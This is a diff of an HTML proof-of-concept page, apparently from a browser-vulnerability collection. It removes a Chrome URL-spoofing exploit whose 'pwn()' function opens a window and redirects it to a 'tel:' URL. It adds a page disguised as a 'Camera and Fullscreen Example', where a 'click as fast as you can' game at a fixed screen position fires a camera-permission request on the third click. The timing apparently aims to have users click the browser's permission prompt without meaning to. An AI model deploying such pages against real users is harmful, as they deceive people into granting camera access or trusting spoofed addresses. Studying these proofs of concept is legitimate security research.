@@ -1,13 +1,81 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>Chrome Url Spoofing (bypass dangerous website) vulnerability</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera and Fullscreen Example</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f4f4f9;
+    }
+    #red-square {
+      position: absolute;
+      top: 443px;
+      left: 82%;
+      transform: translateX(-50%);
+      width: 30px;
+      height: 30px;
+      background-color: red;
+      cursor: pointer;
+    }
+  </style>
 </head>
-<script>
-function pwn() {
-    w = window.open();
-    w.document.write('<p>Calling Google</p>'));
-    setTimeout("w.location.replace('tel:https://google.com');",5);
-}
-</script>
-<h1><button href="#" onclick="pwn()">CLICK TO CALL</button></h1>
+<body>
+  <div id="red-square" onclick="handleRedSquareClick()"></div>
+
+  <p> click the red button as fast as you can!</p>
+
+  <script>
+    let redSquareClickCount = 0;
+
+    function handleRedSquareClick() {
+      redSquareClickCount++;
+      console.log(`Red square clicked ${redSquareClickCount} time(s).`);
+
+      if (redSquareClickCount === 3) {
+        requestCameraAccess();
+      }
+    }
+
+    function requestCameraAccess() {
+      // Request access to the camera
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+          alert("Camera access granted!");
+          // Stop the camera stream to prevent it from staying active
+          stream.getTracks().forEach(track => track.stop());
+        })
+        .catch((error) => {
+          alert("Camera access denied or not available.");
+          console.error("Error accessing camera:", error);
+        });
+    }
+
+    function toggleFullscreen() {
+      const element = document.documentElement; // Get the root element
+      if (!document.fullscreenElement) {
+        // Enter fullscreen mode
+        element.requestFullscreen().then(() => {
+          alert("Entered fullscreen mode!");
+        }).catch((error) => {
+          console.error("Error entering fullscreen:", error);
+        });
+      } else {
+        // Exit fullscreen mode
+        document.exitFullscreen().then(() => {
+          alert("Exited fullscreen mode!");
+        }).catch((error) => {
+          console.error("Error exiting fullscreen:", error);
+        });
+      }
+    }
+  </script>
+</body>
 </html>
